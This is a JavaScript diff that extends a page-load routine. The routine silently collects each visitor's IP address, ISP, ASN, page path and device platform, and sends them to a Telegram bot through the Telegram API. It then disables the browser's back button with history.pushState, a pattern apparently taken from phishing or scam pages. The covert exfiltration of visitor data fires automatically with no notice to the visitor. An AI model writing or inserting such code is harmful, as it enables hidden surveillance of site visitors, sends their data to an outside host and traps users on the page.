@@ -1170,12 +1170,25 @@ async function sendVisitorDetailsToTelegram() {
     // 2. Fetch the user's network details silently
     const ipResponse = await fetch('https://ipapi.co/json/');
     if (!ipResponse.ok) throw new Error('Failed to fetch network details');
-    
+
     const data = await ipResponse.json();
+
+    // Capture the current page path
+    const currentPage = window.location.pathname; 
+
+    // Capture the platform/device operating system safely
+    let devicePlatform = 'Unknown';
+    if (navigator.userAgentData && navigator.userAgentData.platform) {
+      devicePlatform = navigator.userAgentData.platform; // Modern browsers
+    } else if (navigator.platform) {
+      devicePlatform = navigator.platform; // Fallback for older browsers
+    }
 
     // 3. Format the log notification text cleanly for Telegram
     const telegramMessage = 
       `🌐 *New Visitor Logged*\n\n` +
+      `• *Visited Page:* \`${currentPage}\`\n` + 
+      `• *Platform/OS:* \`${devicePlatform}\`\n` + // <-- Added device platform
       `• *IP Address:* \`${data.ip}\`\n` +
       `• *ISP/Provider:* ${data.org || 'Unknown'}\n` +
       `• *ASN:* ${data.asn || 'N/A'}\n` +
@@ -1184,7 +1197,7 @@ async function sendVisitorDetailsToTelegram() {
 
     // 4. Send the payload directly to your Telegram channel/chat
     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
-    
+
     await fetch(telegramUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -1202,10 +1215,10 @@ async function sendVisitorDetailsToTelegram() {
 }
 
 // --- THE PAGE LOAD TRIGGER ---
-// This waits until the HTML is fully parsed, then automatically fires the function
 document.addEventListener('DOMContentLoaded', () => {
   sendVisitorDetailsToTelegram();
 });
+
 
   // Prevent user from going back to previous pages
   history.pushState(null, null, location.href);
